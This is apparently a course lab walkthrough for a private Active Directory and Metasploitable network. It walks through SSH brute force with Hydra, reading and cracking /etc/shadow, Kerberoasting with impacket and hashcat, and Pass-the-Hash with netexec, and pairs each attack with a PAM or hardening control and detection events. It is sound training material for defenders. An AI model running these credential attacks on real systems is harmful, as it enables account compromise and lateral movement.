# Module 06 — System Hacking · Guided Lab Walkthrough

> A step-by-step, **do-it-in-order** lab against **your own** environment only (the AD + Metasploitable lab in [`../../labs/`](../../labs/) — see [`../../labs/topology.md`](../../labs/topology.md)). Each step gives the command, what you should observe, a hint, and the defender/PAM takeaway. Outputs shown are **representative** — yours will differ.

**Goal:** walk the credential-attack chain end-to-end, then *watch a PAM control turn each win into a loss.*

**Targets:** Kali `192.168.56.10` · Metasploitable2 `192.168.56.20` · Windows DC `192.168.56.30` (`ceh.lab`).

**Prereqs:** lab is up (`labs/scripts/setup.sh`), you can ping the targets, and `rockyou.txt` is unpacked (`/usr/share/wordlists/rockyou.txt`).

---

## Part A — Online guessing → offline cracking (the speed lesson)

### A1. Online brute force over SSH (active online attack)
```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.20 -t 4 -f
```
**You should see** Hydra stop on a valid pair:
```
[22][ssh] host: 192.168.56.20   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password found
```
**Observe:** this is *slow* and *loud* — every attempt is a network round-trip and a log line on the target (`/var/log/auth.log`).

<details><summary>Hint if Hydra hangs</summary>Metasploitable's old SSH is picky — add `-t 4` (fewer threads) and `-f` (stop on first hit). If it still stalls, confirm port 22 is open with `nc -nv 192.168.56.20 22`.</details>

### A2. Grab and crack the hash offline
```bash
# from an SSH session on the target (msfadmin/msfadmin), then off-box:
sudo cat /etc/shadow | grep -E 'msfadmin|user' > shadow.txt
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
john --show shadow.txt
```
**You should see** John recover the password in seconds:
```
msfadmin:msfadmin
1 password hash cracked
```
**Observe:** offline is *orders of magnitude faster* and produces **zero** log lines on the target. **This is the core lesson: capture-then-crack beats online guessing.**

**Defender/PAM view:** online guessing is caught by lockout + `4625` spikes; the offline path is caught only by protecting the hash store and using slow, salted KDFs. A [PAM broker](../../defender-pam/pam-architecture.md) with rate-limiting neutralizes A1 entirely.

---

## Part B — Kerberoasting, and the control that kills it

### B1. Request the service ticket and crack it (weak password)
The lab seeds `svc-sql` with an SPN and (initially) a weak password.
```bash
impacket-GetUserSPNs ceh.lab/jdoe:'Passw0rd!' -dc-ip 192.168.56.30 -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```
**You should see** a `$krb5tgs$23$...` hash (the `23` = RC4) and then a crack:
```
$krb5tgs$23$*svc-sql$CEH.LAB$...:Summer2024!
Status...........: Cracked
```
**Observe:** you cracked the **service account's** password — offline, using only a normal user (`jdoe`). No admin needed.

<details><summary>Hint: no hash returned?</summary>Confirm `svc-sql` has an SPN: `impacket-GetUserSPNs ceh.lab/jdoe:'Passw0rd!' -dc-ip 192.168.56.30` (no `-request`) should list it. Check time sync with the DC (`sudo ntpdate 192.168.56.30`) — Kerberos fails on clock skew > 5 min.</details>

### B2. Apply the control, then re-run
Change `svc-sql` to a long random password (or convert to gMSA), then repeat B1:
```powershell
# on the DC (PowerShell) — simulate the fix
Set-ADAccountPassword svc-sql -NewPassword (ConvertTo-SecureString (`
  -join ((33..126)|Get-Random -Count 40|%{[char]$_})) -AsPlainText -Force) -Reset
```
```bash
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt   # re-run
```
**You should see** Hashcat **exhaust the wordlist without cracking**:
```
Status...........: Exhausted
Recovered........: 0/1 (0.00%) Digests
```
**You just demonstrated the control.** The attack still *runs* (you still get a `$krb5tgs$` blob) but the payoff is gone.

**Defender/PAM view:** the durable fix is [gMSA / CPM-rotated service accounts](../../defender-pam/cyberark-attack-mapping.md). Detection: `4769` with RC4 for SPN accounts — see [detection-engineering.md](../../defender-pam/detection-engineering.md).

---

## Part C — Lateral movement, blocked by tiering

### C1. Try Pass-the-Hash to a member host
With a captured local-admin NT hash (from your foothold), attempt reuse:
```bash
netexec smb 192.168.56.31 -u Administrator -H <NT_HASH>
```
**On an unhardened host you'd see** `[+] ...(Pwn3d!)`. **On the tiered lab** you should instead see access **denied** for a Tier-2 credential reaching a protected host:
```
SMB  192.168.56.31  [-] Administrator <hash> STATUS_LOGON_FAILURE
```
**Observe:** LAPS made the local admin hash *unique per host* (so it doesn't reuse), and Protected Users / tiering breaks the logon path.

<details><summary>Hint</summary>If PtH unexpectedly succeeds, the lab host isn't hardened yet — apply LAPS + add the account to Protected Users (see the Ansible AD lab), then retry to see the block.</details>

**Defender/PAM view:** [tiering + Protected Users + LAPS](../../defender-pam/identity-attack-paths.md) collapse the "one hash works everywhere" path. Detection: NTLM `4624` type-3 logons from unusual hosts.

---

## What you should conclude
Every "win" above has a specific control that turns it into a logged, contained "loss":

| You did | The control that stops it |
|---|---|
| Online SSH brute force | Lockout + MFA + PAM rate-limiting |
| Offline hash crack | Protect hash store; slow salted KDFs |
| Kerberoast `svc-sql` | gMSA / CPM-rotated password, AES-only |
| Pass-the-Hash to `ws01` | Tiering + Protected Users + LAPS |

## Cleanup
```bash
rm -f shadow.txt kerb.txt
# revert any lab account password changes if you want to repeat Part B from the weak state
```

## Record it
Log commands, outputs, and what surprised you in the **My lab log** table at the bottom of [README.md](README.md), and note any misses in [PROGRESS.md](../../PROGRESS.md).
